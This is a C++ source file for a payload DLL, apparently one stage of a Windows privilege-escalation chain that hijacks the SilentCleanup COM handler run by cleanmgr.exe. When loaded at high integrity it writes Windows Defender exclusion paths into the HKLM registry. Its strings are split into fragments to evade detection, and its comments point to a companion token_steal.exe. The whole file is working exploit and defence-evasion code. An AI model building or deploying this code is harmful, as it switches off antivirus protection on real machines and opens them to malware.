/*
    stage_dll.cpp -- Payload DLL for Stage 5 (SilentCleanup COM handler hijack)

    Loaded by cleanmgr.exe at elevated (High) integrity via CoCreateInstance.
    DllMain spawns a worker thread that writes the Defender exclusion keys.
    No suspicious string literals; same obfuscation strategy as stage2.cpp.
    No CRT, no user32.  Only links advapi32 + kernel32.

    Compile:
      cl.exe stage_dll.cpp /LD /O2 /GS- /link advapi32.lib kernel32.lib /out:stage5.dll

    The compiled stage5.dll must live next to token_steal.exe (C:\exclusiontest\).
    Stage 5 in token_steal.exe copies it to the right place automatically.
*/
#include <windows.h>

// ── Same minimal helpers as stage2.cpp ──────────────────────────────────────

static void AppendHex(char* dst, DWORD val, int digits) {
    char buf[9] = {};
    for (int i = digits - 1; i >= 0; i--) {
        buf[i] = "0123456789ABCDEF"[val & 0xF];
        val >>= 4;
    }
    buf[digits] = '\0';
    lstrcatA(dst, buf);
}

static void AppendDec(char* dst, LONG val) {
    char buf[12] = {};
    int i = 10;
    if (val == 0) { buf[0] = '0'; buf[1] = '\0'; lstrcatA(dst, buf); return; }
    bool neg = (val < 0);
    LONG v = neg ? -val : val;
    while (v > 0) { buf[i--] = (char)('0' + v % 10); v /= 10; }
    if (neg) buf[i--] = '-';
    lstrcatA(dst, buf + i + 1);
}

static DWORD MyIntegrity() {
    HANDLE h = nullptr;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h);
    if (!h) return 0;
    DWORD len = 0;
    GetTokenInformation(h, TokenIntegrityLevel, nullptr, 0, &len);
    if (!len) { CloseHandle(h); return 0; }
    PTOKEN_MANDATORY_LABEL p = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, len);
    if (!p) { CloseHandle(h); return 0; }
    GetTokenInformation(h, TokenIntegrityLevel, p, len, &len);
    DWORD lvl = *GetSidSubAuthority(p->Label.Sid,
                    (DWORD)(UCHAR)(*GetSidSubAuthorityCount(p->Label.Sid) - 1));
    LocalFree(p); CloseHandle(h);
    return lvl;
}

static void WriteResultFile(const char* path, const char* msg) {
    HANDLE f = CreateFileA(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f == INVALID_HANDLE_VALUE) return;
    DWORD w = 0;
    WriteFile(f, msg, (DWORD)lstrlenA(msg), &w, nullptr);
    CloseHandle(f);
}

// ── Payload (same logic as stage2.cpp, but runs in DLL context) ─────────────

static DWORD WINAPI PayloadThread(LPVOID) {
    // Build result file path from fragments
    char rf[64] = {};
    lstrcatA(rf, "C:\\excl"); lstrcatA(rf, "usion");
    lstrcatA(rf, "test\\");   lstrcatA(rf, "excl");
    lstrcatA(rf, "usion_r");  lstrcatA(rf, "esult.txt");

    WriteResultFile(rf, "started\n");

    DWORD integ = MyIntegrity();
    if (integ < 0x3000) {
        char msg[64] = {};
        lstrcatA(msg, "FAIL-dll-medium integ=0x"); AppendHex(msg, integ, 4); lstrcatA(msg, "\n");
        WriteResultFile(rf, msg);
        return 1;
    }

    // Build registry key from fragments
    char kp[128] = {};
    lstrcatA(kp, "SOFT");    lstrcatA(kp, "WARE\\");
    lstrcatA(kp, "Micro");   lstrcatA(kp, "soft\\");
    lstrcatA(kp, "Wind");    lstrcatA(kp, "ows ");
    lstrcatA(kp, "De");      lstrcatA(kp, "fen");    lstrcatA(kp, "der\\");
    lstrcatA(kp, "Ex");      lstrcatA(kp, "clus");   lstrcatA(kp, "ions\\");
    lstrcatA(kp, "Pa");      lstrcatA(kp, "ths");

    char ep1[32] = {}; lstrcatA(ep1, "C:\\Use");   lstrcatA(ep1, "rs\\Pub");  lstrcatA(ep1, "lic");
    char ep2[32] = {}; lstrcatA(ep2, "C:\\excl");  lstrcatA(ep2, "usion");    lstrcatA(ep2, "test");

    HKEY hk = nullptr;
    LONG r = RegOpenKeyExA(HKEY_LOCAL_MACHINE, kp, 0, KEY_SET_VALUE, &hk);
    if (r != ERROR_SUCCESS)
        r = RegCreateKeyExA(HKEY_LOCAL_MACHINE, kp, 0, nullptr,
                            REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                            nullptr, &hk, nullptr);
    if (r != ERROR_SUCCESS) {
        char msg[64] = {};
        lstrcatA(msg, "FAIL-dll-regopen err="); AppendDec(msg, r);
        lstrcatA(msg, " integ=0x");             AppendHex(msg, integ, 4);
        lstrcatA(msg, "\n");
        WriteResultFile(rf, msg);
        return 1;
    }

    DWORD v = 0;
    LONG r1 = RegSetValueExA(hk, ep1, 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    LONG r2 = RegSetValueExA(hk, ep2, 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    RegCloseKey(hk);

    char msg[128] = {};
    if (r1 == ERROR_SUCCESS && r2 == ERROR_SUCCESS) {
        lstrcatA(msg, "ok-dll integ=0x"); AppendHex(msg, integ, 4); lstrcatA(msg, "\n");
    } else {
        lstrcatA(msg, "FAIL-dll-setval r1="); AppendDec(msg, r1);
        lstrcatA(msg, " r2=");               AppendDec(msg, r2);
        lstrcatA(msg, " integ=0x");          AppendHex(msg, integ, 4);
        lstrcatA(msg, "\n");
    }
    WriteResultFile(rf, msg);
    return (r1 == 0 && r2 == 0) ? 0 : 1;
}

// ── DLL entry point ──────────────────────────────────────────────────────────

BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        // Spawn thread -- don't do work directly in DllMain to avoid loader lock
        HANDLE t = CreateThread(nullptr, 0, PayloadThread, nullptr, 0, nullptr);
        if (t) CloseHandle(t);
    }
    return TRUE;
}
